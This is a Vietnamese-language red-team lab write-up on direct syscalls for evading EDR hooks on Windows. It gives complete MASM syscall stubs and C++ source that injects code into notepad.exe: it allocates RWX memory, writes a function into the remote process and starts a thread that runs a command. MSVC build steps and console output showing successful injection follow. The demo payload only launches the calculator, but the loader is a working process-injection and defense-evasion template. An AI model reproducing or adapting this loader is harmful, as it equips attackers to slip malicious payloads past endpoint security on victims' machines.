
---

# 📝 [PE 24] Direct Syscalls (Kernel-mode Direct Transition Evasion)

## 📌 1. Tổng Quan Kỹ Thuật (Technical Overview)

**Direct Syscalls (Giải thuật chuyển đổi ngắt hệ thống trực tiếp)** đại diện cho một trong những giải thuật né tránh phòng thủ động (Dynamic Evasion) triệt để và mạnh mẽ nhất ở cấp độ kiến trúc vi xử lý (Assembly Level), được thiết kế để vô hiệu hóa hoàn toàn cơ chế giám sát User-mode Inline Hooking của mọi giải pháp AV/EDR hiện đại.

Khi các giải pháp bảo mật bọc đầu hệ thống bằng cách chỉnh sửa, ghi đè mã máy (Patching) lên các hàm Native API lọt lòng thư viện liên kết động tối cao `ntdll.dll`, họ cưỡng bách dòng chảy thực thi của tiến trình phải rẽ nhánh (JMP) về phía không gian ảo của EDR Engine để phân tích chỉ dấu hành vi.

Kỹ thuật Direct Syscalls bẻ gãy toàn diện ma trận trinh sát này bằng chiến thuật **Tái cấu trúc Stub ngắt phần cứng (System Call Re-architecting)** ngay bên trong lòng file thực thi của Loader. Loader chủ động đóng vai trò là một máy phát Syscall độc lập (Independent Syscall Generator), chuyển giao quyền thực thi và tham số dữ liệu thẳng từ không gian người dùng (User-mode/Ring 3) xuống nhân hệ điều hành (Kernel-mode/Ring 0) thông qua lệnh gọi phần cứng đặc quyền, tước bỏ hoàn toàn khả năng can thiệp hay bắt chặn luồng Telemetry của EDR trên bộ nhớ RAM ảo.

### 🎯 Mục tiêu nghiên cứu:

* **Triệt tiêu quyền kiểm soát User-mode Inline Hooking**: Vượt qua 100% hàng rào giám sát tại không gian Ring 3 của EDR mà không cần thực hiện giải thuật gỡ Hook (Unhooking - PE 07).
* **Làm chủ kiến trúc gọi hàm x64 Assembly**: Nghiên cứu quy chuẩn nạp thanh ghi và Calling Convention hạ tầng của Windows Subsystem.
* **Tích hợp hợp ngữ Native**: Hiện thực hóa quy trình biên dịch phối hợp (Hybrid Compilation) giữa mã nguồn C++ và tệp hợp ngữ `.asm` trên môi trường MSVC.

---

## 🔬 2. Giải Phẫu Cơ Chế Hệ Thống (Windows Internals Analysis)

Trên kiến trúc phần cứng bộ vi xử lý Intel/AMD x64, một hàm Native API sạch nằm lọt lòng `ntdll.dll` luôn tuân theo một khuôn mẫu cấu trúc mã máy (Stub) toán học cố định để chuyển giao trạng thái Ring bảo mật của CPU:

```assembly
mov     r10, rcx
mov     eax, SyscallNumber
syscall
ret

```

* **`mov r10, rcx`**: Thực hiện sao chép tham số đầu tiên (First Parameter) từ thanh ghi `RCX` sang thanh ghi `R10`. Thủ tục này bắt buộc phải diễn ra do lệnh gọi đặc quyền `syscall` của CPU sẽ tự động ghi đè và phá hủy giá trị lưu trữ trong thanh ghi `RCX`.
* **`mov eax, SSN`**: Nạp Số hiệu dịch vụ hệ thống (System Service Number - SSN) tương ứng của hàm hệ thống được triệu hồi vào thanh ghi tích lũy `EAX`.
* **`syscall`**: Lệnh ngắt phần cứng đặc quyền của CPU x64 nhằm bẻ hướng con trỏ lệnh, chuyển đổi trạng thái thực thi từ Ring 3 (User-mode) xuống Ring 0 (Kernel-mode).

Quy trình giải phẫu chuyển ranh giới bảo mật của giải thuật Direct Syscalls diễn ra ngầm như sau:

```
[ Loader biên dịch tệp hạ tầng .asm ]
       └──> [ Nạp thủ công mã hiệu dịch vụ SSN vào thanh ghi EAX ]
                 └──> [ Phát lệnh Assembly 'syscall' trực tiếp lên CPU ]
                           └──> [ CPU hoán chuyển Ring bảo mật hạ cánh xuống Ring 0 ]

```

Do mã nguồn của Loader tự chuẩn bị và đóng gói cấu trúc Stub Assembly này bên trong một tệp hợp ngữ độc lập, khi CPU nhận lệnh xử lý thực thi lệnh `syscall`, nhân Kernel Windows sẽ tiếp nhận và xử lý tác vụ can thiệp bộ nhớ chéo tiến trình một cách bình thường. Dòng chảy thực thi bẻ gãy 100% các byte bẫy Hook (`JMP`) của EDR đặt trên phân đoạn `.text` của thư viện `ntdll.dll` sống trên RAM.

---

## 🛠️ 3. Quy Trình Cài Đặt Mã Nguồn (Implementation)

Để triển khai thực nghiệm, dự án yêu cầu phân tách cấu trúc mã nguồn làm 2 tệp tin độc lập tuyến tính: Tệp hợp ngữ hạ tầng x64 (`syscalls.asm`) đóng vai trò là khung xương sinh mã máy ngắt phần cứng và tệp mã nguồn chính (`Source.cpp`) đóng vai trò là khối điều phối tham số cấu trúc.

### 📜 Bước 3.1: Tạo tệp hợp ngữ hạ tầng 

### syscalls.asm:
```assembly
.code

; Dinh nghia cong Syscall truc tiep cho ham NtAllocateVirtualMemory
NtAllocateVirtualMemoryProc proc
    mov r10, rcx
    mov eax, 18h          ; Syscall Number mac dinh cua NtAllocateVirtualMemory
    syscall
    ret
NtAllocateVirtualMemoryProc endp

; Dinh nghia cong Syscall truc tiep cho ham NtWriteVirtualMemory
NtWriteVirtualMemoryProc proc
    mov r10, rcx
    mov eax, 3Ah          ; Syscall Number mac dinh cua NtWriteVirtualMemory
    syscall
    ret
NtWriteVirtualMemoryProc endp

end

```

### 📜 Bước 3.2: Tạo tệp mã nguồn chính 

### Source.cpp:
```cpp
#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <string>
#include <vector>

// 1. Khai báo các hàm ngoại vi liên kết trực tiếp với file .asm của ta
extern "C" NTSTATUS NtAllocateVirtualMemoryProc(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

extern "C" NTSTATUS NtWriteVirtualMemoryProc(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T NumberOfBytesToWrite,
    PSIZE_T NumberOfBytesWritten
);

// Khai báo nguyên mẫu hàm Native của NtCreateThreadEx để tự thích ứng động với Build Number Windows 11
typedef NTSTATUS(NTAPI* pNtCreateThreadEx)(
    OUT PHANDLE ThreadHandle,
    IN ACCESS_MASK DesiredAccess,
    IN PVOID ObjectAttributes OPTIONAL,
    IN HANDLE ProcessHandle,
    IN PVOID StartRoutine,
    IN PVOID Argument OPTIONAL,
    IN ULONG CreateFlags,
    IN ULONG_PTR ZeroBits,
    IN SIZE_T StackSize,
    IN SIZE_T MaximumStackSize,
    IN PVOID AttributeList OPTIONAL
    );

typedef UINT(WINAPI* fnWinExec)(LPCSTR lpCmdLine, UINT uCmdShow);

typedef struct _THREAD_DATA {
    fnWinExec pWinExec;       // Địa chỉ tuyệt đối của hàm WinExec trên RAM tiến trình đích
    char szCommand[32];       // Chuỗi lệnh thực thi chức năng mở máy tính
} THREAD_DATA, * PTHREAD_DATA;

// Hàm chức năng độc lập vị trí gánh luồng chạy khi tiêm trực tiếp thông qua cổng Syscall
DWORD WINAPI RemoteDirectSyscallPayload(LPVOID lpParam) {
    PTHREAD_DATA pData = (PTHREAD_DATA)lpParam;
    if (pData && pData->pWinExec) {
        // Bẻ gãy hoàn toàn lỗi RIP tương đối bằng con trỏ tuyệt đối
        pData->pWinExec(pData->szCommand, SW_HIDE);
    }
    return 0;
}

// Bộ quét RAM động tự động nhận diện PID, KHÔNG PHÂN BIỆT chữ hoa chữ thường
DWORD GetProcessIDByName(const std::wstring& processName) {
    DWORD processID = 0;
    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    if (Process32FirstW(hSnapshot, &pe32)) {
        do {
            if (_wcsicmp(pe32.szExeFile, processName.c_str()) == 0) {
                processID = pe32.th32ProcessID;
                break;
            }
        } while (Process32NextW(hSnapshot, &pe32));
    }
    CloseHandle(hSnapshot);
    return processID;
}

int main() {
    std::cout << "====================================================" << std::endl;
    std::cout << "[*] PE 24: DIRECT SYSCALLS INJECTION" << std::endl;
    std::cout << "====================================================" << std::endl;

    std::wstring targetProcess = L"notepad.exe";
    DWORD pid = GetProcessIDByName(targetProcess);

    if (pid == 0) {
        std::cerr << "[-] Notepad.exe khong chay! Vui long bat Notepad truoc nhen." << std::endl;
        std::cin.get();
        return EXIT_FAILURE;
    }

    std::cout << "[+] Da tim thay Notepad.exe voi PID: " << pid << std::endl;

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        std::cerr << "[-] OpenProcess failed!" << std::endl;
        return EXIT_FAILURE;
    }

    // Nạp động trích xuất con trỏ hàm NtCreateThreadEx bảo đảm vượt qua sự biến động số hiệu trên Windows 11
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    pNtCreateThreadEx NtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");

    // ─── BƯỚC 2: GỌI TRỰC TIẾP CỔNG ASSEMBLY ĐỂ CẤP PHÁT VÙNG NHỚ TỪ XA (ZERO STATIC BUFFERS) ───
    PVOID remoteCodeBuffer = NULL;
    SIZE_T functionSize = 500;
    // Hệ điều hành tự động cập nhật làm tròn trang nhớ (Page Alignment) lên bội số 4KB qua con trỏ tham số
    NtAllocateVirtualMemoryProc(hProcess, &remoteCodeBuffer, 0, &functionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    PVOID remoteDataBuffer = NULL;
    SIZE_T dataSize = sizeof(THREAD_DATA);
    NtAllocateVirtualMemoryProc(hProcess, &remoteDataBuffer, 0, &dataSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (!remoteCodeBuffer || !remoteDataBuffer) {
        std::cerr << "[-] Direct Syscall NtAllocateVirtualMemoryProc failed!" << std::endl;
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }
    std::cout << "[+] Cap phat vung nho Code RWX tu xa bang Direct Syscall: 0x" << std::hex << remoteCodeBuffer << std::endl;

    // Khởi tạo cấu trúc tham số tuyệt đối cục bộ trước khi đẩy sang RAM đối phương
    THREAD_DATA localData;
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (hKernel32) {
        localData.pWinExec = (fnWinExec)GetProcAddress(hKernel32, "WinExec");
    }
    strcpy_s(localData.szCommand, "cmd.exe /c start calc");

    // ─── BƯỚC 3: GỌI TRỰC TIẾP CỔNG ASSEMBLY ĐỂ GHI DỮ LIỆU SANG RAM ĐỐI PHƯƠNG ───
    SIZE_T bytesWritten = 0;
    NtWriteVirtualMemoryProc(hProcess, remoteCodeBuffer, (PVOID)RemoteDirectSyscallPayload, functionSize, &bytesWritten);
    NtWriteVirtualMemoryProc(hProcess, remoteDataBuffer, &localData, sizeof(THREAD_DATA), &bytesWritten);
    std::cout << "[+] Ghi logic ham va cau truc tham so qua cong Syscall hoan tat." << std::endl;

    // ─── BƯỚC 4: KÍCH NỔ THREAD TỪ XA BẰNG CỔNG NATIVE TỰ THÍCH ỨNG ───
    std::cout << "[*] Dang khoi tao luong tu xa de khai hoa..." << std::endl;
    HANDLE hThread = NULL;
    NTSTATUS status = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, remoteCodeBuffer, remoteDataBuffer, 0, 0, 0, 0, NULL);

    if (hThread != NULL) {
        // Cấu hình cờ đợi INFINITE gánh luồng sống độc lập phẳng sạch
        WaitForSingleObject(hThread, INFINITE);
        std::cout << "[+] Direct Syscalls Injection Successful!" << std::endl;
        CloseHandle(hThread);
    }
    else {
        std::cerr << "[-] NtCreateThreadEx failed! Status code: 0x" << std::hex << status << std::endl;
    }

    // Giải phóng và đóng Handle triệt để chống rò rỉ bộ nhớ
    CloseHandle(hProcess);

    std::cout << "\n[*] Hoan thanh quy trinh. Nhan Enter de dong cua so..." << std::endl;
    std::cin.get();
    return EXIT_SUCCESS;
}

```

<img width="1378" height="764" alt="image" src="https://github.com/user-attachments/assets/88b55945-8a94-4170-8b29-d5fed23f1c2c" />


---

## 🎛️ 4. Hướng Dẫn Cấu Hình Đóng Gói (Build & Deployment)

Do mô hình cấu trúc của dự án tích hợp mã nguồn hợp ngữ Native (`.asm`), Vinh cần cấu hình cho trình biên dịch MSVC của Microsoft Visual Studio kích hoạt phân hệ biên dịch MASM theo quy trình chuẩn hóa sau:

### ⚙️ Thiết lập cấu hình Hợp ngữ (MASM Setup):

1. Tại cửa sổ giao diện **Solution Explorer**, click chuột phải vào tên Project $\rightarrow$ Chọn mục **`Build Dependencies`** $\rightarrow$ Click chọn **`Build Customizations...`**
2. Tích chọn vào hộp kiểm **`masm (.targets, .props)`** và nhấn `OK` để nhúng MASM Compiler vào dự án.
3. Tiến hành click chuột phải vào tệp tin `Syscalls.asm` $\rightarrow$ Chọn **`Properties`**. Tại mục cấu hình `Item Type`, chuyển đổi sang thuộc tính dạng **`Microsoft Macro Assembler`** và nhấn Apply.
<img width="1424" height="822" alt="image" src="https://github.com/user-attachments/assets/a1f199ae-b324-455b-962c-5a2f0c46927f" />


### ⚙️ Cấu hình liên kết tĩnh thư viện độc lập:

1. Đặt thanh công cụ quản lý dự án chính xác ở chế độ chuyên dụng **`Release`** và kiến trúc nền tảng phần cứng **`x64`**.
2. Di chuyển đến phân hệ: `Project Properties` $\rightarrow$ `C/C++` $\rightarrow$ `Code Generation` $\rightarrow$ Tại thông số thuộc tính mục `Runtime Library`, thiết lập sang cờ liên kết tĩnh **`Multi-threaded (/MT)`** nhằm liên kết toàn vẹn mã nguồn CRT lọt lòng file thực thi `.exe`.
3. Tiến hành chọn thao tác **`Rebuild`** để kết xuất tệp tin nhị phân tối cao phẳng sạch.

---

## 📊 5. Thực Nghiệm Kích Hoạt Thực Tế (Demonstration)

Khởi chạy tiến trình vỏ bọc `Notepad.exe` trên môi trường máy Lab, mở phân hệ PowerShell ngoài đĩa thô thực thi tệp tin nhị phân xuất bản nhằm theo dõi ma trận ngắt phần cứng:

```powershell
PS C:\Users\Admin\source\repos\Task6\PE24_DirectSyscalls\x64\Release> C:\Users\Admin\source\repos\Task6\PE24_DirectSyscalls\x64\Release\DirectSyscalls.exe
====================================================
[*] PE 24: DIRECT SYSCALLS INJECTION
====================================================
[+] Da tim thay Notepad.exe voi PID: 13464
[+] Cap phat vung nho Code RWX tu xa bang Direct Syscall: 0x0000019C97350000
[+] Ghi logic ham va cau truc tham so qua cong Syscall hoan tat.
[*] Dang khoi tao luong tu xa de khai hoa...
[+] Direct Syscalls Injection Successful!

[*] Hoan thanh quy trinh. Nhan Enter de dong cua so...

```

### Demo:
<img width="1920" height="600" alt="devenv_3zdlCYiqkG" src="https://github.com/user-attachments/assets/95a8eb76-66e0-4d64-aa84-5d10714e61bc" />



---

## 📚 6. Tài Liệu Tham Khảo (Technical References)

* **Intel® 64 and IA-32 Architectures Instruction Set Reference**: *SYSCall — Fast System Call (Volume 2B)* - Hardware-level ngắt specification document.
* **Outflank (Security Research)**: *Direct Syscalls: A Technical Analysis on EDR Interception Evasion* - [https://outflank.nl/blog/](https://www.google.com/search?q=https://outflank.nl/blog/)
* **j00ru (Windows System Internals)**: *Windows X64 System Service Numbers Table* - [https://j00ru.vect3r.net/syscalls/nt-64-all.html](https://www.google.com/search?q=https://j00ru.vect3r.net/syscalls/nt-64-all.html)
* **MITRE ATT&CK Matrix**: *Defense Evasion: Native API Execution via Direct Syscalls (T1106)* & *Process Injection (T1055)*.

---
